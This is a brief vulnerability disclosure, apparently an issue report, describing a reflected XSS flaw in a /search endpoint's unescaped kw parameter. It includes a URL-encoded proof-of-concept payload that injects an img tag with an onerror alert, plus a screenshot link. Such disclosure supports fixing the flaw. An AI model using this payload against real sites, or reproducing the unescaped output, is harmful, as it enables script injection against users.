# Summary

The /search endpoint is used for frontend article search, the user-controlled kw parameter has no security checks, and the output has no encoding processing, thus creating reflected XSS vulnerabilities.

# POC

```
http://localhost:8080/search?kw=1%22%3E%3Cimg+src%3D1+onerror%3Dalert%28%2Fsearch%2F%29%3E
```

![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773132464711-a00d62d2-f025-4fe0-bf32-d5b6b5dd76d0.png)
